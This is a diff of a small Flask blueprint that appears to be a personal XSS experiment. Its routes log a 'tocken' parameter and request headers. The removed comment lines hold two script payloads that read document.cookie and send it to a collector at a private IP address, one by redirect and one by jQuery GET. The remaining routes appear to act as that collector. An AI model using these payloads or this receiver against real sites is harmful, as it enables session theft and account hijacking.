@@ -1,14 +1,11 @@
 from flask import Blueprint
+from flask import current_app
+from flask import make_response
 from flask import redirect
 from flask import request
-from flask import url_for
 
 test = Blueprint('test', __name__,
                  template_folder='templates')
-
-# <script> var tocken = document.cookie; window.location.href='http://192.168.230.249:5000/test?tocken='+tocken</script>
-
-# <script> var tocken = document.cookie; $.get('http://192.168.230.249:5000/test?tocken='+tocken, function(result){ console.log('hacked'); }); </script>
 
 @test.route('/')
 def testtocken():
@@ -17,9 +14,9 @@ def testtocken():
     print(tocken)
     return redirect(ref,302,Response=None)
 
+@test.route('/test')
+def ttt():
+    print(request.headers)
+    resp = make_response()
+    return resp
 
-import sets
-magic_char = {'交易时间'}
-poppins_chars = {'交易时间（家庭理财）'}
-print(magic_char & poppins_chars)   #InterSection
-print(magic_char | poppins_chars)   #Union
